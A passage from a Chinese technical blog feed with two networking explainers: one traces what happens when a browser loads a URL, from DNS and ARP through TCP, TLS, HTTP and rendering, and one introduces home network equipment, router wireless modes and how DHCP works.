<h1 id="DNS-查询"><a href="#DNS-查询" class="headerlink" title="DNS 查询"></a>DNS 查询</h1><ul>
<li>浏览器检查域名是否在缓存当中（要查看 Chrome 当中的缓存， 打开 chrome://net-internals/#dns）。</li>
<li>如果缓存中没有，就去调用 gethostbyname 库函数（操作系统不同函数也不同）进行查询。<br>gethostbyname 函数在试图进行DNS解析之前首先检查域名是否在本地 Hosts 里，Hosts 的位置 不同的操作系统有所不同</li>
<li>如果 gethostbyname 没有这个域名的缓存记录，也没有在 hosts 里找到，它将会向 DNS 服务器发送一条 DNS 查询请求。DNS 服务器是由网络通信栈提供的，通常是本地路由器或者 ISP 的缓存 DNS 服务器。</li>
<li>查询本地 DNS 服务器</li>
<li>如果 DNS 服务器和我们的主机在同一个子网内，系统会按照下面的 ARP 过程对 DNS 服务器进行 ARP查询</li>
<li>如果 DNS 服务器和我们的主机在不同的子网，系统会按照下面的 ARP 过程对默认网关进行查询<h1 id="ARP-过程"><a href="#ARP-过程" class="headerlink" title="ARP 过程"></a>ARP 过程</h1>要想发送 ARP（地址解析协议）广播，我们需要有一个目标 IP 地址，同时还需要知道用于发送 ARP 广播的接口的 MAC 地址。</li>
<li>首先查询 ARP 缓存，如果缓存命中，我们返回结果：目标 IP = MAC<br>如果缓存没有命中：</li>
<li>查看路由表，看看目标 IP 地址是不是在本地路由表中的某个子网内。是的话，使用跟那个子网相连的接口，否则使用与默认网关相连的接口。</li>
<li>查询选择的网络接口的 MAC 地址</li>
<li>我们发送一个二层（ OSI 模型 中的数据链路层）ARP 请求：</li>
</ul>
<p><code>ARP Request</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sender MAC: interface:mac:address:here</span><br><span class="line">Sender IP: interface.ip.goes.here</span><br><span class="line">Target MAC: FF:FF:FF:FF:FF:FF (Broadcast)</span><br><span class="line">Target IP: target.ip.goes.here</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>根据连接主机和路由器的硬件类型不同，可以分为以下几种情况：</p>
<p>直连：</p>
<ul>
<li>如果我们和路由器是直接连接的，路由器会返回一个 ARP Reply （见下面）。</li>
</ul>
<p>集线器：</p>
<ul>
<li>如果我们连接到一个集线器，集线器会把 ARP 请求向所有其它端口广播，如果路由器也“连接”在其中，它会返回一个 <code>ARP Reply</code> 。</li>
</ul>
<p>交换机：</p>
<ul>
<li>如果我们连接到了一个交换机，交换机会检查本地 CAM/MAC 表，看看哪个端口有我们要找的那个 MAC 地址，如果没有找到，交换机会向所有其它端口广播这个 ARP 请求。</li>
<li>如果交换机的 MAC/CAM 表中有对应的条目，交换机会向有我们想要查询的 MAC 地址的那个端口发送 ARP 请求</li>
<li>如果路由器也“连接”在其中，它会返回一个 <code>ARP Reply</code></li>
</ul>
<p><code>ARP Reply</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sender MAC: target:mac:address:here</span><br><span class="line">Sender IP: target.ip.goes.here</span><br><span class="line">Target MAC: interface:mac:address:here</span><br><span class="line">Target IP: interface.ip.goes.here</span><br></pre></td></tr></table></figure>
<p>现在我们有了 DNS 服务器或者默认网关的 IP 地址，我们可以继续 DNS 请求了：</p>
<ul>
<li>使用 53 端口向 DNS 服务器发送 UDP 请求包，如果响应包太大，会使用 TCP 协议</li>
<li>如果 LDNS 没有命中，就直接跳到 Root Server 域名服务器请求解析</li>
<li>根域名服务器返回给 LDNS 一个所查询域的主域名服务器（gTLD Server，国际顶尖域名服务器，如.com .cn .org等）地址</li>
<li>此时 LDNS 再发送请求给上一步返回的 gTLD</li>
<li>接受请求的 gTLD 查找并返回这个域名对应的 Name Server 的地址，这个 Name Server 就是网站注册的域名服务器</li>
<li>Name Server 根据映射关系表找到目标 ip，将 ip 连同一个 TTL 值返回给 DNS Server 域名服务器。</li>
<li>LDNS拿到ip和TTL会缓存起来，缓存时间由TTL值控制</li>
<li>把解析的结果返回给用户，用户根据TTL值缓存在本地系统缓存中，域名解析过程结束。</li>
</ul>
<h1 id="使用套接字"><a href="#使用套接字" class="headerlink" title="使用套接字"></a>使用套接字</h1><p>当浏览器得到了目标服务器的 IP 地址，以及 URL 中给出来端口号（http 协议默认端口号是 80， https 默认端口号是 443），它会调用系统库函数 <code>socket</code> ，请求一个 TCP 流套接字，对应的参数是 <code>AF_INET/AF_INET6</code> 和 <code>SOCK_STREAM</code>。</p>
<ul>
<li><p>这个请求首先被交给传输层，在传输层请求被封装成 TCP segment。目标端口会被加入头部，源端口会在系统内核的动态端口范围内选取（Linux下是ip_local_port_range)</p>
</li>
<li><p>TCP segment 被送往网络层，网络层会在其中再加入一个 IP 头部，里面包含了目标服务器的IP地址以及本机的IP地址，把它封装成一个IP packet。</p>
</li>
<li><p>这个 TCP packet 接下来会进入链路层，链路层会在封包中加入 frame 头部，里面包含了本地内置网卡的MAC地址以及网关（本地路由器）的 MAC 地址。像前面说的一样，如果内核不知道网关的 MAC 地址，它必须进行 ARP 广播来查询其地址。</p>
</li>
</ul>
<p>到了现在，TCP 封包已经准备好了，可以使用下面的方式进行传输：</p>
<ul>
<li>以太网</li>
<li>WiFi</li>
<li>蜂窝数据网络</li>
</ul>
<p>对于大部分家庭网络和小型企业网络来说，封包会从本地计算机出发，经过本地网络，再通过调制解调器把数字信号转换成模拟信号，使其适于在电话线路，有线电视光缆和无线电话线路上传输。在传输线路的另一端，是另外一个调制解调器，它把模拟信号转换回数字信号，交由下一个网络节点处理。节点的目标地址和源地址将在后面讨论。</p>
<p>大型企业和比较新的住宅通常使用光纤或直接以太网连接，这种情况下信号一直是数字的，会被直接传到下一个 网络节点 进行处理。</p>
<p>最终封包会到达管理本地子网的路由器。在那里出发，它会继续经过自治区域(autonomous system, 缩写 AS)的边界路由器，其他自治区域，最终到达目标服务器。一路上经过的这些路由器会从IP数据报头部里提取出目标地址，并将封包正确地路由到下一个目的地。IP数据报头部 time to live (TTL) 域的值每经过一个路由器就减1，如果封包的TTL变为0，或者路由器由于网络拥堵等原因封包队列满了，那么这个包会被路由器丢弃。</p>
<p>上面的发送和接受过程在 TCP 连接期间会发生很多次：</p>
<ul>
<li><p>客户端选择一个初始序列号(ISN)，将设置了 SYN 位的封包发送给服务器端，表明自己要建立连接并设置了初始序列号</p>
</li>
<li><p><strong><em>服务器端接收到 SYN 包，如果它可以建立连接：</em></strong></p>
<ul>
<li>服务器端选择它自己的初始序列号</li>
<li>服务器端设置 SYN 位，表明自己选择了一个初始序列号</li>
<li>服务器端把 (客户端ISN + 1) 复制到 ACK 域，并且设置 ACK 位，表明自己接收到了客户端的第一个封包</li>
</ul>
</li>
<li><p><strong><em>客户端通过发送下面一个封包来确认这次连接：</em></strong></p>
<ul>
<li>自己的序列号+1</li>
<li>接收端 ACK+1</li>
<li>设置 ACK 位</li>
</ul>
</li>
<li><p><strong><em>数据通过下面的方式传输：</em></strong></p>
<ul>
<li>当一方发送了N个 Bytes 的数据之后，将自己的 SEQ 序列号也增加N</li>
<li>另一方确认接收到这个数据包（或者一系列数据包）之后，它发送一个 ACK 包，ACK 的值设置为接收到的数据包的最后一个序列号</li>
</ul>
</li>
<li><p><strong><em>关闭连接时：</em></strong></p>
<ul>
<li>要关闭连接的一方发送一个 FIN 包</li>
<li>另一方确认这个 FIN 包，并且发送自己的 FIN 包</li>
<li>要关闭的一方使用 ACK 包来确认接收到了 FIN</li>
</ul>
</li>
</ul>
<h1 id="TLS-握手"><a href="#TLS-握手" class="headerlink" title="TLS 握手"></a>TLS 握手</h1><ul>
<li><p>客户端发送一个 <code>ClientHello</code> 消息到服务器端，消息中同时包含了它的 Transport Layer Security (TLS) 版本，可用的加密算法和压缩算法。</p>
</li>
<li><p>服务器端向客户端返回一个 <code>ServerHello</code> 消息，消息中包含了服务器端的TLS版本，服务器所选择的加密和压缩算法，以及数字证书认证机构（Certificate Authority，缩写 CA）签发的服务器公开证书，证书中包含了公钥。客户端会使用这个公钥加密接下来的握手过程，直到协商生成一个新的对称密钥</p>
</li>
<li><p>客户端根据自己的信任CA列表，验证服务器端的证书是否可信。如果认为可信，客户端会生成一串伪随机数，使用服务器的公钥加密它。这串随机数会被用于生成新的对称密钥</p>
</li>
<li><p>服务器端使用自己的私钥解密上面提到的随机数，然后使用这串随机数生成自己的对称主密钥</p>
</li>
<li><p>客户端发送一个 <code>Finished</code> 消息给服务器端，使用对称密钥加密这次通讯的一个散列值</p>
</li>
<li><p>服务器端生成自己的 hash 值，然后解密客户端发送来的信息，检查这两个值是否对应。如果对应，就向客户端发送一个 <code>Finished</code> 消息，也使用协商好的对称密钥加密</p>
</li>
<li><p>从现在开始，接下来整个 TLS 会话都使用对称秘钥进行加密，传输应用层（HTTP）内容</p>
</li>
</ul>
<h1 id="HTTP-协议"><a href="#HTTP-协议" class="headerlink" title="HTTP 协议"></a>HTTP 协议</h1><p>如果浏览器使用 HTTP 协议，它会向服务器发送这样的一个请求:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: www.baidu.com</span><br><span class="line">Connection: keep-alive</span><br><span class="line">[其他头部]</span><br></pre></td></tr></table></figure>
<p>“其他头部”包含了一系列的由冒号分割开的键值对，它们的格式符合 HTTP 协议标准，它们之间由一个换行符分割开来。（这里我们假设浏览器没有违反 HTTP 协议标准的 bug，同时假设浏览器使用 <code>HTTP/1.1</code> 协议，不然的话头部可能不包含 <code>Host</code> 字段，同时 <code>GET</code> 请求中的版本号会变成 <code>HTTP/1.0</code> 或者 <code>HTTP/0.9</code> 。）</p>
<p>HTTP/1.1 定义了“关闭连接”的选项 “close”，发送者使用这个选项指示这次连接在响应结束之后会断开。例如：</p>
<blockquote>
<p>Connection:close</p>
</blockquote>
<p>不支持持久连接的 HTTP/1.1 应用必须在每条消息中都包含 “close” 选项。</p>
<p>在发送完这些请求和头部之后，浏览器发送一个换行符，表示要发送的内容已经结束了。</p>
<p>服务器端返回一个响应码，指示这次请求的状态，响应的形式是这样的:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">200 OK</span><br><span class="line">[响应头部]</span><br></pre></td></tr></table></figure>

<p>然后是一个换行，接下来有效载荷(payload)，也就是 <code>www.baiud.com</code> 的HTML内容。服务器不会关闭连接，因为客户端请求保持连接，服务器端会保持连接打开，以供之后的请求重用。</p>
<p>如果浏览器发送的HTTP头部包含了足够多的信息（例如包含了 Etag 头部），以至于服务器可以判断出，浏览器缓存的文件版本自从上次获取之后没有再更改过，服务器可能会返回这样的响应:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">304 Not Modified</span><br><span class="line">[响应头部]</span><br></pre></td></tr></table></figure>
<p>这个响应没有有效载荷，浏览器会从自己的缓存中取出想要的内容。</p>
<p>在解析完 HTML 之后，浏览器和客户端会重复上面的过程，直到HTML页面引入的所有资源（图片，CSS，favicon.ico等等）全部都获取完毕，区别只是头部的 <code>GET / HTTP/1.1</code> 会变成 <code>GET /$(相对www.baidu.com的URL) HTTP/1.1</code> 。</p>
<p>如果 HTML 引入了 <code>www.baidu.com</code> 域名之外的资源，浏览器会回到上面解析域名那一步，按照下面的步骤往下一步一步执行，请求中的 <code>Host</code> 头部会变成另外的域名。</p>
<h1 id="HTTP-服务器请求处理"><a href="#HTTP-服务器请求处理" class="headerlink" title="HTTP 服务器请求处理"></a>HTTP 服务器请求处理</h1><p>HTTPD(HTTP Daemon)在服务器端处理请求/响应。最常见的 HTTPD 有 Linux 上常用的 Apache 和 nginx，以及 Windows 上的 IIS。</p>
<ul>
<li><p>HTTPD 接收请求</p>
</li>
<li><p><strong><em>服务器把请求拆分为以下几个参数：</em></strong></p>
<ul>
<li>HTTP 请求方法(GET, POST, HEAD, PUT, DELETE, CONNECT, OPTIONS, 或者 TRACE)。直接在地址栏中输入 URL 这种情况下，使用的是 GET 方法</li>
<li>域名：baidu.com</li>
<li>请求路径/页面：/ (我们没有请求baidu.com下的指定的页面，因此 / 是默认的路径)</li>
</ul>
</li>
<li><p>服务器验证其上已经配置了 baidu.com 的虚拟主机</p>
</li>
<li><p>服务器验证 baidu.com 接受 GET 方法<br>服务器验证该用户可以使用 GET 方法(根据 IP 地址，身份信息等)</p>
</li>
<li><p>如果服务器安装了 URL 重写模块（例如 Apache 的 mod_rewrite 和 IIS 的 URL Rewrite），服务器会尝试匹配重写规则，如果匹配上的话，服务器会按照规则重写这个请求</p>
</li>
<li><p>服务器根据请求信息获取相应的响应内容，这种情况下由于访问路径是 “/“ ,会访问首页文件（你可以重写这个规则，但是这个是最常用的）。</p>
</li>
<li><p>服务器会使用指定的处理程序分析处理这个文件，假如 Baidu 使用 PHP，服务器会使用 PHP 解析 index 文件，并捕获输出，把 PHP 的输出结果返回给请求者。</p>
</li>
</ul>
<h1 id="浏览器背后的故事"><a href="#浏览器背后的故事" class="headerlink" title="浏览器背后的故事"></a>浏览器背后的故事</h1><p>当服务器提供了资源之后（HTML，CSS，JS，图片等），浏览器会执行下面的操作：</p>
<ul>
<li>解析 —— HTML，CSS，JS</li>
<li>渲染 —— 构建 DOM 树 -&gt; 渲染 -&gt; 布局 -&gt; 绘制</li>
</ul>
<h1 id="浏览器"><a href="#浏览器" class="headerlink" title="浏览器"></a>浏览器</h1><p>浏览器的功能是从服务器上取回你想要的资源，然后展示在浏览器窗口当中。资源通常是 HTML 文件，也可能是 PDF，图片，或者其他类型的内容。资源的位置通过用户提供的 URI(Uniform Resource Identifier) 来确定。</p>
<p>浏览器解释和展示 HTML 文件的方法，在 HTML 和 CSS 的标准中有详细介绍。这些标准由 Web 标准组织 W3C(World Wide Web Consortium) 维护。</p>
<p>不同浏览器的用户界面大都十分接近，有很多共同的 UI 元素：</p>
<ul>
<li>一个地址栏</li>
<li>后退和前进按钮</li>
<li>书签选项</li>
<li>刷新和停止按钮</li>
<li>主页按钮</li>
</ul>
<h2 id="浏览器高层架构"><a href="#浏览器高层架构" class="headerlink" title="浏览器高层架构"></a>浏览器高层架构</h2><p>组成浏览器的组件有：</p>
<ul>
<li><p><strong>用户界面</strong> 用户界面包含了地址栏，前进后退按钮，书签菜单等等，除了请求页面之外所有你看到的内容都是用户界面的一部分</p>
</li>
<li><p><strong>浏览器引擎</strong> 浏览器引擎负责让 UI 和渲染引擎协调工作<br>渲染引擎 渲染引擎负责展示请求内容。如果请求的内容是 HTML，渲染引擎会解析 HTML 和 CSS，然后将内容展示在屏幕上</p>
</li>
<li><p><strong>网络组件</strong> 网络组件负责网络调用，例如 HTTP 请求等，使用一个平台无关接口，下层是针对不同平台的具体实现</p>
</li>
<li><p><strong>UI后端</strong> UI 后端用于绘制基本 UI 组件，例如下拉列表框和窗口。UI 后端暴露一个统一的平台无关的接口，下层使用操作系统的 UI 方法实现</p>
</li>
<li><p><strong>Javascript 引擎</strong> Javascript 引擎用于解析和执行 Javascript 代码</p>
</li>
<li><p><strong>数据存储</strong> 数据存储组件是一个持久层。浏览器可能需要在本地存储各种各样的数据，例如 Cookie 等。浏览器也需要支持诸如 localStorage，IndexedDB，WebSQL 和 FileSystem 之类的存储机制</p>
</li>
</ul>
<h1 id="HTML-解析"><a href="#HTML-解析" class="headerlink" title="HTML 解析"></a>HTML 解析</h1><p>浏览器渲染引擎从网络层取得请求的文档，一般情况下文档会分成8kB大小的分块传输。</p>
<p>HTML 解析器的主要工作是对 HTML 文档进行解析，生成解析树。</p>
<p>解析树是以 DOM 元素以及属性为节点的树。DOM是文档对象模型(Document Object Model)的缩写，它是 HTML 文档的对象表示，同时也是 HTML 元素面向外部(如Javascript)的接口。树的根部是”Document”对象。整个 DOM 和 HTML 文档几乎是一对一的关系。</p>
<h2 id="解析算法"><a href="#解析算法" class="headerlink" title="解析算法"></a>解析算法</h2><p>HTML不能使用常见的自顶向下或自底向上方法来进行分析。主要原因有以下几点:</p>
<ul>
<li><p>语言本身的“宽容”特性</p>
</li>
<li><p>HTML 本身可能是残缺的，对于常见的残缺，浏览器需要有传统的容错机制来支持它们</p>
</li>
<li><p>解析过程需要反复。对于其他语言来说，源码不会在解析过程中发生变化，但是对于 HTML 来说，动态代码，例如脚本元素中包含的 document.write() 方法会在源码中添加内容，也就是说，解析过程实际上会改变输入的内容<br>由于不能使用常用的解析技术，浏览器创造了专门用于解析 HTML 的解析器。解析算法在 HTML5 标准规范中有详细介绍，算法主要包含了两个阶段：标记化（tokenization）和树的构建。</p>
</li>
</ul>
<h2 id="解析结束之后"><a href="#解析结束之后" class="headerlink" title="解析结束之后"></a>解析结束之后</h2><p>浏览器开始加载网页的外部资源（CSS，图像，Javascript 文件等）。</p>
<p>此时浏览器把文档标记为可交互的（interactive），浏览器开始解析处于“推迟（deferred）”模式的脚本，也就是那些需要在文档解析完毕之后再执行的脚本。之后文档的状态会变为“完成（complete）”，浏览器会触发“加载（load）”事件。</p>
<p>注意解析 HTML 网页时永远不会出现“无效语法（Invalid Syntax）”错误，浏览器会修复所有错误内容，然后继续解析。</p>
<h1 id="CSS-解析"><a href="#CSS-解析" class="headerlink" title="CSS 解析"></a>CSS 解析</h1><ul>
<li>根据 CSS词法和句法 分析CSS文件和 <code>&lt;style&gt;</code> 标签包含的内容以及 style 属性的值</li>
<li>每个CSS文件都被解析成一个样式表对象（StyleSheet object），这个对象里包含了带有选择器的CSS规则，和对应CSS语法的对象</li>
<li>CSS解析器可能是自顶向下的，也可能是使用解析器生成器生成的自底向上的解析器</li>
</ul>
<h1 id="页面渲染"><a href="#页面渲染" class="headerlink" title="页面渲染"></a>页面渲染</h1><ul>
<li><p>通过遍历DOM节点树创建一个“Frame 树”或“渲染树”，并计算每个节点的各个CSS样式值</p>
</li>
<li><p>通过累加子节点的宽度，该节点的水平内边距(padding)、边框(border)和外边距(margin)，自底向上的计算”Frame 树”中每个节点的首选(preferred)宽度</p>
</li>
<li><p>通过自顶向下的给每个节点的子节点分配可行宽度，计算每个节点的实际宽度</p>
</li>
<li><p>通过应用文字折行、累加子节点的高度和此节点的内边距(padding)、边框(border)和外边距(margin)，自底向上的计算每个节点的高度</p>
</li>
<li><p>使用上面的计算结果构建每个节点的坐标</p>
</li>
<li><p>当存在元素使用 <code>floated</code>，位置有 <code>absolutely</code> 或 <code>relatively</code> 属性的时候，会有更多复杂的计算，详见<a href="http://dev.w3.org/csswg/css2/">http://dev.w3.org/csswg/css2/</a> 和 <a href="http://www.w3.org/Style/CSS/current-work">http://www.w3.org/Style/CSS/current-work</a></p>
</li>
<li><p>创建layer(层)来表示页面中的哪些部分可以成组的被绘制，而不用被重新栅格化处理。每个帧对象都被分配给一个层</p>
</li>
<li><p>页面上的每个层都被分配了纹理</p>
</li>
<li><p>每个层的帧对象都会被遍历，计算机执行绘图命令绘制各个层，此过程可能由CPU执行栅格化处理，或者直接通过D2D/SkiaGL在GPU上绘制</p>
</li>
<li><p>上面所有步骤都可能利用到最近一次页面渲染时计算出来的各个值，这样可以减少不少计算量</p>
</li>
<li><p>计算出各个层的最终位置，一组命令由 Direct3D/OpenGL发出，GPU命令缓冲区清空，命令传至GPU并异步渲染，帧被送到Window Server。</p>
</li>
</ul>
<h1 id="GPU-渲染"><a href="#GPU-渲染" class="headerlink" title="GPU 渲染"></a>GPU 渲染</h1><ul>
<li>在渲染过程中，图形处理层可能使用通用用途的 CPU，也可能使用图形处理器 GPU</li>
<li>当使用 GPU 用于图形渲染时，图形驱动软件会把任务分成多个部分，这样可以充分利用 GPU 强大的并行计算能力，用于在渲染过程中进行大量的浮点计算。</li>
</ul>
<h1 id="Window-Server"><a href="#Window-Server" class="headerlink" title="Window Server"></a>Window Server</h1><h1 id="后期渲染与用户引发的处理"><a href="#后期渲染与用户引发的处理" class="headerlink" title="后期渲染与用户引发的处理"></a>后期渲染与用户引发的处理</h1><p>渲染结束后，浏览器根据某些时间机制运行 JavaScript 代码或与用户交互(在搜索栏输入关键字获得搜索建议)。类似 Flash 和 Java 的插件也会运行，尽管 Baidu 主页里没有。这些脚本可以触发网络请求，也可能改变网页的内容和布局，产生又一轮渲染与绘制。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li><a href="https://github.com/skyline75489/what-happens-when-zh_CN">What-happens-when</a></li>
</ol>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>HTTP</tag>
      </tags>
  </entry>
  <entry>
    <title>家庭网络漫游指南</title>
    <url>/2019/09/27/home-internet/</url>
    <content><![CDATA[<h2 id="光猫"><a href="#光猫" class="headerlink" title="光猫"></a>光猫</h2><blockquote>
<p>光网络终端（英语：Optical Network Terminals，俗称光猫或光 modem），是指通过光纤介质进行传输，将光信号调制解调为其他协议信号的网络设备。光猫设备作为大型局域网、城域网和广域网的中继传输设备。</p>
</blockquote>
<p>光猫的主要功能为信号转换，它的后端接口除了连接电脑，还可以连接电视或电话。 </p>
<h2 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h2><blockquote>
<p>路由器（英语：Router，又称路径器）是一种电讯网络设备，提供路由与转送两种重要机制，可以决定数据包从来源端到目的端所经过的路由路径（host 到 host 之间的传输路径），这个过程称为路由；将路由器输入端的数据包移送至适当的路由器输出端（在路由器内部进行），这称为转送。路由工作在 OSI 模型的第三层——即网络层，例如网际协议（IP）。</p>
</blockquote>
<span id="more"></span>

<h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>路由器就是连接两个以上个别网络的设备。</p>
<p>由于位于两个或更多个网络的交汇处，从而可在它们之间传递分组（一种数据的组织形式）。路由器与交换机在概念上有一定重叠但也有不同：交换机泛指工作于任何网络层次的数据中继设备（尽管多指网桥），而路由器则更专注于网络层。</p>
<p>路由器与交换机的差别，路由器是属于 OSI 第三层的产品，交換机是 OSI 第二层的产品。第二层的产品功能在于，将网络上各个计算机的 MAC 地址记在 MAC 地址表中，当局域网中的计算机要经过交換机去交换传递数据时，就查询交換机上的 MAC 地址表中的信息，将数据包发送给指定的计算机，而不会像第一层的产品（如集线器）每台在网络中的计算机都发送。而路由器除了有交換机的功能外，更拥有路由表作为发送数据包时的依据，在有多种选择的路径中选择最佳的路径。此外，并可以连接两个以上不同网段的网络，而交換机只能连接两个。并具有 IP 分享的功能，如：区分哪些数据包是要发送至 WAN。路由表存储了（向前往）某一网络的最佳路径，该路径的“路由度量值”以及下一个（跳路由器）。参考条目路由获得这个过程的详细描述。</p>
<h3 id="WAN-口和-LAN口"><a href="#WAN-口和-LAN口" class="headerlink" title="WAN 口和 LAN口"></a>WAN 口和 LAN口</h3><p>路由器通常包含一个 WAN 口多个 LAN 口(PS: 有些特殊的路由器包含多个 WAN 口)。</p>
<blockquote>
<p>广域网（英语：Wide Area Network，缩写为 WAN），又称广域网、外网、公网。是连接不同地区局域网或城域网计算机通信的远程网。通常跨接很大的物理范围，所覆盖的范围从几十公里到几千公里，它能连接多个地区、城市和国家，或横跨几个洲并能提供远距离通信，形成国际性的远程网络。广域网并不等同于互联网。</p>
</blockquote>
<blockquote>
<p>局域网（Local Area Network，简称 LAN）是连接住宅、学校、实验室、大学校园或办公大楼等有限区域内计算机的计算机网络。相比之下，广域网（WAN）不仅覆盖较大的地理距离，而且还通常涉及固接专线和对于互联网的链接。 相比来说互联网则更为广阔，是连接全球商业和个人计算机的系统。</p>
</blockquote>
<p>通常情况下，宽带安装好以后使用网线连接光猫和路由器 WAN 口，其他设备连接路由器 LAN 口或者无线网络即可浏览互联网。</p>
<h3 id="路由器的六种无线模式"><a href="#路由器的六种无线模式" class="headerlink" title="路由器的六种无线模式"></a>路由器的六种无线模式</h3><h4 id="无线访问节点-AP「Access-Point」"><a href="#无线访问节点-AP「Access-Point」" class="headerlink" title="无线访问节点 (AP「Access Point」)"></a>无线访问节点 (AP「Access Point」)</h4><p>该模式下路由器的无线网卡就像一个”无线 HUB”，负责建立无线路由器和电脑之间的数据链路（相当于无形的网线）。正常情况下，家用的无线路由器的无线连接都默认工作在此模式下。</p>
<h4 id="客户端-Client"><a href="#客户端-Client" class="headerlink" title="客户端 (Client)"></a>客户端 (Client)</h4><p>像笔记本电脑上的无线网卡那样工作，仅连接其它的无线网络，而不发射自己的无线网络信号。对于无线路由器来说，这种模式相当于启用了一个无线的 WAN 口，且下面的电脑只能通过有线方式接到此设备。内部的LAN口组成的局域网和连接上的无线网段处于相同的 IP 地址段。内部的 DHCP 请求也会被转发到主无线网络上。</p>
<h4 id="客户端网桥-Client-Bridge"><a href="#客户端网桥-Client-Bridge" class="headerlink" title="客户端网桥 (Client Bridge)"></a>客户端网桥 (Client Bridge)</h4><p>和“客户端”模式一样，相当于启用了一个无线的 WAN 口，且下面的电脑只能通过有线方式接到此设备。不过，该模式下无线路由器仍然提供 DHCP 及 NAT 功能，内部 LAN 口组成的单独 IP 地址段局域网，通过无线路由器上自己的网关，连上外部主网络。</p>
<h4 id="Adhoc"><a href="#Adhoc" class="headerlink" title="Adhoc"></a>Adhoc</h4><p>Adhoc 有个形象的比喻，就像是将两台电脑之间直接找根网线连起来，只不过在这里这根网线是个无线的。最常见的使用adhoc连接的设备多数是一些手持游戏机。该模式在无线路由器上使用的场合比较罕见。</p>
<h4 id="中继-Repeater"><a href="#中继-Repeater" class="headerlink" title="中继 (Repeater)"></a>中继 (Repeater)</h4><p>顾名思义，中继就是一边是接受信号，一边又发射自己的无线信号。在这种模式下无线路由器以无线网卡客户身份接入主 AP，然后再以新增虚拟界面(Virtual Interfaces)来为客户端提供无线接入。该模式的最大意义在于可以解决无线信号受到距离或者障碍物的影响不能传输到更远的问题。<br>接入到该无线路由器上的电脑终端，是和主无线网网络处在相同的 IP 地址段。内部的 DHCP 请求，也会被转发到主无线网络上。</p>
<h4 id="中继桥接-Repeater-Bridge"><a href="#中继桥接-Repeater-Bridge" class="headerlink" title="中继桥接 (Repeater Bridge)"></a>中继桥接 (Repeater Bridge)</h4><p>和”中继”模式一样，可以解决无线信号受到距离或者障碍物的影响不能传输到更远的问题。不过，这种模式下无线路由器仍然提供 DHCP 及 NAT 功能，即所有的内部 LAN 口以及无线客户接入组成的是一个单独的局域网网段。</p>
<h2 id="DHCP"><a href="#DHCP" class="headerlink" title="DHCP"></a>DHCP</h2><blockquote>
<p>动态主机设置协议（英语：Dynamic Host Configuration Protocol，缩写：DHCP）是一个用于局域网的网络协议，位于 OSI 模型的应用层，使用 UDP 协议工作，主要有两个用途：</p>
<ul>
<li>用于内部网或网络服务供应商自动分配IP地址给用户</li>
<li>用于内部网管理员作为对所有计算机作中央管理的手段</li>
</ul>
</blockquote>
<h3 id="解析-DHCP-的工作方式"><a href="#解析-DHCP-的工作方式" class="headerlink" title="解析 DHCP 的工作方式"></a>解析 DHCP 的工作方式</h3><p>当一台机器新加入一个网络的时候，肯定一脸懵，啥情况都不知道，只知道自己的 MAC 地址。怎么办？先吼一句，我来啦，有人吗？这时候的沟通基本靠“吼”。这一步，我们称为 DHCP Discover。</p>
<p>新来的机器使用 IP 地址 0.0.0.0 发送了一个广播包，目的 IP 地址为 255.255.255.255。广播包封装了 UDP，UDP 封装了 BOOTP。其实 DHCP 是 BOOTP 的增强版，但是如果你去抓包的话，很可能看到的名称还是 BOOTP 协议。</p>
<p>在这个广播包里面，新人大声喊：我是新来的（Boot request），我的 MAC 地址是这个，我还没有 IP，谁能给租给我个 IP 地址！</p>
<p>格式就像这样：<br><img src="/images/home-internet1.png" alt="48ff99d2.png"></p>
<p>如果一个网络管理员在网络里面配置了 DHCP Server 的话，他就相当于这些 IP 的管理员。他立刻能知道来了一个“新人”。这个时候，我们可以体会 MAC 地址唯一的重要性了。当一台机器带着自己的 MAC 地址加入一个网络的时候，MAC 是它唯一的身份，如果连这个都重复了，就没办法配置了。</p>
<p>只有 MAC 唯一，IP 管理员才能知道这是一个新人，需要租给它一个 IP 地址，这个过程我们称为 DHCP Offer。同时，DHCP Server 为此客户保留为它提供的 IP 地址，从而不会为其他 DHCP 客户分配此 IP 地址。</p>
<p>DHCP Offer 的格式就像这样，里面有给新人分配的地址。</p>
<p><img src="/images/home-internet2.png" alt="646daabe.png"><br>DHCP Server 仍然使用广播地址作为目的地址，因为，此时请求分配 IP 的新人还没有自己的 IP。DHCP Server 回复说，我分配了一个可用的 IP 给你，你看如何？除此之外，服务器还发送了子网掩码、网关和 IP 地址租用期等信息。</p>
<p>新来的机器很开心，它的“吼”得到了回复，并且有人愿意租给它一个 IP 地址了，这意味着它可以在网络上立足了。当然更令人开心的是，如果有多个 DHCP Server，这台新机器会收到多个 IP 地址，简直受宠若惊。</p>
<p>它会选择其中一个 DHCP Offer，一般是最先到达的那个，并且会向网络发送一个 DHCP Request 广播数据包，包中包含客户端的 MAC 地址、接受的租约中的 IP 地址、提供此租约的 DHCP 服务器地址等，并告诉所有 DHCP Server 它将接受哪一台服务器提供的 IP 地址，告诉其他 DHCP 服务器，谢谢你们的接纳，并请求撤销它们提供的 IP 地址，以便提供给下一个 IP 租用请求者。<br><img src="/images/home-internet3.png" alt="d17afbba.png"><br>此时，由于还没有得到 DHCP Server 的最后确认，客户端仍然使用 0.0.0.0 为源 IP 地址、255.255.255.255 为目标地址进行广播。在 BOOTP 里面，接受某个 DHCP Server 的分配的 IP。</p>
<p>当 DHCP Server 接收到客户机的 DHCP request 之后，会广播返回给客户机一个 DHCP ACK 消息包，表明已经接受客户机的选择，并将这一 IP 地址的合法租用信息和其他的配置信息都放入该广播包，发给客户机，欢迎它加入网络大家庭。</p>
<p><img src="/images/home-internet4.png" alt="6dc28c84.png"></p>
<p>最终租约达成的时候，还是需要广播一下，让大家都知道。</p>
